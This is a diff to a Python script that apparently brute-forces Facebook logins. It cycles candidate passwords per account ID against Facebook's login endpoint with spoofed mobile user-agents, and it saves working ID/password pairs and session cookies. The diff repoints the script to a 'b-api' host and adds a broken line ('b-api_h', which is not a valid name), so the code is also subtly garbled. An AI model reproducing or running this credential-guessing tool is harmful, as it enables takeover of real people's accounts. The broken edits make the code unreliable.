@@ -31,11 +31,11 @@ try:
 except ImportError:
         os.system("pip2 install bs4")
 
-host="https://api.facebook.com"
+host="https://b-api.facebook.com"
 ua="Mozilla/5.0 (Linux; Android 7.0; LG-H870 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/315.0.0.47.113;]"
 ips=None
 try:
-	b=requests.get("https://api.ipify.org").text.strip()
+	b=requests.get("https://b-api.ipify.org").text.strip()
 	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
 except:
 	ips=None
@@ -43,7 +43,7 @@ uas=None
 if os.path.exists(".browser"):
 	if os.path.getsize(".browser") !=0:
 		uas=open(".browser").read().strip()
-mbasic_h={"Host":"api.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+api_h={"Host":"b-api.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 def clear():
 	if " linux" in sys.platform.lower():
 		os.system("clear")
@@ -324,8 +324,8 @@ def publik():
 def api(em,pas,hosts):
 	global ua,api_h
 	r=requests.Session()
-	r.headers.update(api_h)
-	p=r.get("https://api.facebook.com/")
+	r.headers.update(b-api_h)
+	p=r.get("https://b-api.facebook.com/")
 	b=bs4.BeautifulSoup(p.text,"html.parser")
 	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
 	data={}
@@ -344,8 +344,8 @@ def api(em,pas,hosts):
 		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
 		}
 	)
-	r.headers.update({"referer":"https://api.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-	po=r.post("https://api.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	r.headers.update({"referer":"https://b-api.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://b-api.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
 	if "c_user" in r.cookies.get_dict().keys():
 		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	elif "checkpoint" in r.cookies.get_dict().keys():
@@ -492,7 +492,7 @@ class crack:
 		try:
 			for i in fl.get("pw"):
 				log=api(fl.get("id"),
-					i,"https://api.facebook.com")
+					i,"https://b-api.facebook.com")
 				if log.get("status")=="success":
 					print("\r\033[0;97m[Ok]%s %s \033[0;96m•\033[0;94m %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
